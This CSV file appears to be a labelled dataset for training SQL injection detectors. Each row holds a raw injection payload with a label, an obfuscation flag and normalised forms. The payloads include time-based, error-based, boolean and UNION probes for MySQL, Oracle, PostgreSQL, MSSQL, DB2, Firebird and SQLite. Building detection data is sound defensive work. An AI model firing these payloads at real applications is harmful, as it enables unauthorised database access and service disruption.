payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,1,sqli_dataset.csv,,True,"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""%"" = """,<NUM>%<STR>%<STR>
"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1'|| ( select 'baur' from dual where 9384 = 9384 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM><STR>baur' from dual where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
"iif  (  6307  =  2459,1,1/0  )  ",1,sqli_dataset.csv,,False,"iif ( 6307 = 2459,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )"
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",1,sqli_dataset.csv,,True,"1"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""hhwy"" = ""hhwy",<NUM><STR>hhwy<STR>hhwy
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",1,sqli_dataset.csv,,True,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'lkun' like 'lkun",<NUM><STR>lkun<STR>lkun
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,1,sqli_dataset.csv,,False,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'foju' = 'foju,<NUM><STR>foju<STR>foju
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'oskf' like 'oskf",1,sqli_dataset.csv,,False,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'oskf' like 'oskf","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( <STR> like 'oskf"
"1"" and make_set  (  8403  =  8403,8899  )   and ""bbgg""  =  ""bbgg",1,sqli_dataset.csv,,False,"1"" and make_set ( 8403 = 8403,8899 ) and ""bbgg"" = ""bbgg",<NUM><STR>bbgg<STR>bbgg
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""zzca""  =  ""zzca",1,sqli_dataset.csv,,False,"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""zzca"" = ""zzca",<NUM><STR>zzca<STR>zzca
1'   )    )     )   and 7401  =  9838#,1,sqli_dataset.csv,,False,1' ) ) ) and 7401 = 9838#,<NUM>' ) ) ) and <NUM> = <NUM>#
1'   )    )    as vnwn where 8774  =  8774 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sqli_dataset.csv,,False,1' ) ) as vnwn where 8774 = 8774 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,<NUM>' ) ) as vnwn where <NUM> = <NUM> and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #
" end and    (    (   ""kvts"" like ""kvts",1,sqli_dataset.csv,,False,"end and ( ( ""kvts"" like ""kvts","end and ( ( <STR> like ""kvts"
-6566'  )   as kggb where 9768  =  9768 order by 1--,1,sqli_dataset.csv,,False,-6566' ) as kggb where 9768 = 9768 order by 1--,-<NUM>' ) as kggb where <NUM> = <NUM> order by <NUM>--
"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,True,"1'+ ( select 'bztp' where 2541 = 2541 union all select null,null,null,null,null,null,null,null,null,null--","<NUM><STR>bztp' where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null--"
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",1,sqli_dataset.csv,,False,"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--","-<NUM>"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",1,sqli_dataset.csv,,False,"-6581'|| ( select 'hpjd' where 7608 = 7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#","-<NUM><STR>hpjd' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,1,sqli_dataset.csv,,False,"-2414%"" ) or elt ( 1032 = 1032,3623 ) and ( ""%"" = """,-<NUM>%<STR>%<STR>
"1'  )   where 3579  =  3579   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,sqli_dataset.csv,,False,"1' ) where 3579 = 3579 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --","<NUM>' ) where <NUM> = <NUM> ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from information_schema.system_users ) --"
"1' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sqli_dataset.csv,,False,"1' or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>' or <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1' where 8360  =  8360 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sqli_dataset.csv,,False,"1' where 8360 = 8360 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --","<NUM>' where <NUM> = <NUM> or <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>
1'  )   as tqdg where 9355  =  9355,1,sqli_dataset.csv,,False,1' ) as tqdg where 9355 = 9355,<NUM>' ) as tqdg where <NUM> = <NUM>
"-7388""  )   as rlth where 5746  =  5746 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sqli_dataset.csv,,False,"-7388"" ) as rlth where 5746 = 5746 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --","-<NUM>"" ) as rlth where <NUM> = <NUM> or <NUM> = ctxsys.drithsx.sn ( <NUM>, ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --"
"1"" where 4991  =  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>"" where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
"-3518  )   union all select 1877,1877,1877,1877#",1,sqli_dataset.csv,,False,"-3518 ) union all select 1877,1877,1877,1877#","-<NUM> ) union all select <NUM>,<NUM>,<NUM>,<NUM>#"
"1  )   where 5073  =  5073 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1 ) where 5073 = 5073 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM> ) where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sqli_dataset.csv,,False,"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #","<NUM>"" ) ) ) rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #"
"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",1,sqli_dataset.csv,,False,"-4830"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""dyut"" = ""dyut",-<NUM><STR>dyut<STR>dyut
"1""  )   as fcrx where 2929  =  2929 and 2820  =  5133",1,sqli_dataset.csv,,False,"1"" ) as fcrx where 2929 = 2929 and 2820 = 5133","<NUM>"" ) as fcrx where <NUM> = <NUM> and <NUM> = <NUM>"
"-8414%""  )   union all select 2795#",1,sqli_dataset.csv,,False,"-8414%"" ) union all select 2795#","-<NUM>%"" ) union all select <NUM>#"
select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,1,sqli_dataset.csv,,False,select sleep ( 5 ) and ( ( ( 'iwwa' like 'iwwa,select sleep ( <NUM> ) and ( ( ( <STR> like 'iwwa
1   )    )    and   (  3020  =  3020  )  *6703 and    (    (   3078  =  3078,1,sqli_dataset.csv,,False,1 ) ) and ( 3020 = 3020 ) *6703 and ( ( 3078 = 3078,<NUM> ) ) and ( <NUM> = <NUM> ) *<NUM> and ( ( <NUM> = <NUM>
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,sqli_dataset.csv,,True,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )","<NUM> and extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) )"
"-9770'   )    )    as ovhh where 7903  =  7903 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sqli_dataset.csv,,False,"-9770' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --","-<NUM>' ) ) as ovhh where <NUM> = <NUM> or <NUM> = ctxsys.drithsx.sn ( <NUM>, ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --"
1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1,sqli_dataset.csv,,False,1'|| ( select 'tcfy' where 4546 = 4546 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) ||',<NUM><STR>tcfy<STR>
"-4580"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dbhb""  =  ""dbhb",1,sqli_dataset.csv,,True,"-4580"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""dbhb"" = ""dbhb",-<NUM><STR>dbhb<STR>dbhb
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,sqli_dataset.csv,,False,1 ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,<NUM> ) ) and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #
-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,1,sqli_dataset.csv,,False,-8051 ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( 5637 = 5637,-<NUM> ) or <NUM> = ( <STR>|| ( select case <NUM> when <NUM> then <NUM> else <NUM> end from rdb$database ) ||<STR> ) and ( <NUM> = <NUM>
1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,1,sqli_dataset.csv,,False,1' and ( 3435 = 7210 ) *7210 and 'lxxt' = 'lxxt,<NUM><STR>lxxt<STR>lxxt
"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",1,sqli_dataset.csv,,False,"-3068%"" ) ) union all select 6597,6597,6597,6597,6597,6597,6597,6597--","-<NUM>%"" ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""pnsz"" like ""pnsz",1,sqli_dataset.csv,,True,"1"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""pnsz"" like ""pnsz",<NUM><STR>pnsz<STR>pnsz
"-2725"" union all select 3671,3671,3671,3671,3671#",1,sqli_dataset.csv,,False,"-2725"" union all select 3671,3671,3671,3671,3671#","-<NUM>"" union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,1,sqli_dataset.csv,,False,1' ) ) as cyom where 2318 = 2318 and 7533 = 7533--,<NUM>' ) ) as cyom where <NUM> = <NUM> and <NUM> = <NUM>--
1 where 3956  =  3956,1,sqli_dataset.csv,,False,1 where 3956 = 3956,<NUM> where <NUM> = <NUM>
"1""  )   where 4971  =  4971 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sqli_dataset.csv,,True,"1"" ) where 4971 = 4971 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --","<NUM>"" ) where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x76555642 ) ) --"
"-3205""  )   union all select 5233,5233,5233,5233#",1,sqli_dataset.csv,,False,"-3205"" ) union all select 5233,5233,5233,5233#","-<NUM>"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>#"
"1""  )   and 8677  =  9054#",1,sqli_dataset.csv,,False,"1"" ) and 8677 = 9054#","<NUM>"" ) and <NUM> = <NUM>#"
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",1,sqli_dataset.csv,,False,"1"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""oyfz"" = ""oyfz",<NUM><STR>oyfz<STR>oyfz
"1""  )   where 5870  =  5870 union all select null,null,null--",1,sqli_dataset.csv,,False,"1"" ) where 5870 = 5870 union all select null,null,null--","<NUM>"" ) where <NUM> = <NUM> union all select null,null,null--"
"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sqli_dataset.csv,,False,"1 where 7158 = 7158 or elt ( 5873 = 5873,sleep ( 5 ) ) #","<NUM> where <NUM> = <NUM> or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #"
1   )    )    and 4637  =  1408 and    (    (   6509  =  6509,1,sqli_dataset.csv,,False,1 ) ) and 4637 = 1408 and ( ( 6509 = 6509,<NUM> ) ) and <NUM> = <NUM> and ( ( <NUM> = <NUM>
"1""  )   where 2570  =  2570 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sqli_dataset.csv,,False,"1"" ) where 2570 = 2570 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>"" ) where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",1,sqli_dataset.csv,,False,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""yxes"" like ""yxes","select like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) and ( <STR> like ""yxes"
"-4325' or make_set  (  9354  =  9354,7185  )  ",1,sqli_dataset.csv,,False,"-4325' or make_set ( 9354 = 9354,7185 )","-<NUM>' or make_set ( <NUM> = <NUM>,<NUM> )"
"1"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>"" and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi",1,sqli_dataset.csv,,True,"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'cfhi' like 'cfhi",<NUM><STR>cfhi<STR>cfhi
"1'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sqli_dataset.csv,,False,"1' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>' ) ) and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --"
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""xxug""  =  ""xxug",1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""xxug"" = ""xxug","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( ( <STR> = ""xxug"
"1"" order by 1#",1,sqli_dataset.csv,,False,"1"" order by 1#","<NUM>"" order by <NUM>#"
"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",1,sqli_dataset.csv,,False,"1"" ) ) as ycvh where 4523 = 4523 and sleep ( 5 ) #","<NUM>"" ) ) as ycvh where <NUM> = <NUM> and sleep ( <NUM> ) #"
1%'   )    )     )   and 9198  =  9198--,1,sqli_dataset.csv,,False,1%' ) ) ) and 9198 = 9198--,<NUM>%' ) ) ) and <NUM> = <NUM>--
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,1,sqli_dataset.csv,,False,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'zjun' = 'zjun,<NUM><STR>zjun<STR>zjun
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sqli_dataset.csv,,False,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM> ) ) or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #
"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sqli_dataset.csv,,False,"1"" ) as dfmm where 7563 = 7563 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>"" ) as dfmm where <NUM> = <NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --"
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,False,"1 ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) ) ) or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
"1%""   )    )     )   and 8438  =  7620--",1,sqli_dataset.csv,,False,"1%"" ) ) ) and 8438 = 7620--","<NUM>%"" ) ) ) and <NUM> = <NUM>--"
1 and 7533  =  7533,1,sqli_dataset.csv,,False,1 and 7533 = 7533,<NUM> and <NUM> = <NUM>
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,sqli_dataset.csv,,False,"1 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )","<NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) )"
"1' where 6953  =  6953 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1' where 6953 = 6953 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' where <NUM> = <NUM> or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",1,sqli_dataset.csv,,False,"-5198 ) ) ) union all select 7089,7089,7089,7089,7089,7089,7089,7089#","-<NUM> ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sqli_dataset.csv,,True,"1"" ) ) as wugz where 5355 = 5355 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --","<NUM>"" ) ) as wugz where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x76555642 ) ) --"
"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sqli_dataset.csv,,False,"1%' ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>%' ) ) and <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
